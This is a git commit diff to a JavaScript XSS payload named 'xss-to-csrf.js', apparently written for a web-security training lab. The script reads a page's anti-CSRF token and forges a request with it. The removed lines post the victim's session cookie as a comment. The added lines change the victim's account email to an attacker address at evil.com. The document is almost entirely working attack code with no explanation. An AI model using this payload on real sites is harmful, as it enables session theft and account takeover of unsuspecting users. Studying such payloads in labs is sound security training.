51c8523f807b9a5f90a0e31236aea8fdd7395c0a
alfa8sa <alfagemesergio@gmail.com>
2023-06-06 16:55:54 +0200

    Update xss-to-csrf.js

--- xss-to-csrf.js
+++ xss-to-csrf.js
@@ -1,14 +1,14 @@
 var request = new XMLHttpRequest();
 request.responseType = "document"
-request.open("GET", "/post?postId=7", true);
+request.open("GET", "/my-account", true);
 
 request.onload = function(e) {
   var csrf = e.target.response['body'].querySelectorAll('[name="csrf"]')[0].value;
   
-  data = "csrf=" + csrf + "&postId=7&comment=" + document.cookie + "&name=victim&email=victim@victim.com&website=http://victim.com"
+  data = "email=attackerm@evil.com&csrf=" + csrf
   
   var request = new XMLHttpRequest();
-  request.open("POST", "/post/comment", true);
+  request.open("POST", "/my-account/change-email", true);
   request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   request.send(data);
 }
